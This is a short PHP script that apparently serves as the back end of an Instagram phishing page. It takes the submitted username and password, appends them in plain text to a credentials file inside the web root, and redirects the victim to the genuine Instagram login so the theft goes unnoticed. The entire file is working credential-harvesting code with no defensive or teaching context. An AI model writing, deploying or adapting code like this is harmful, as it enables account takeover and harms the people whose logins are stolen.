<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Sanitize inputs
    $username = htmlspecialchars($username, ENT_QUOTES, 'UTF-8');
    $password = htmlspecialchars($password, ENT_QUOTES, 'UTF-8');

    // Save to file
    $file = fopen("/var/www/html/credentials.txt", "a");
    fwrite($file, "Username: $username, Password: $password\n");
    fclose($file);

    // Redirect to Instagram
    header("Location: https://www.instagram.com/accounts/login/");
    exit();
} else {
    echo "Invalid request method.";
}
?>
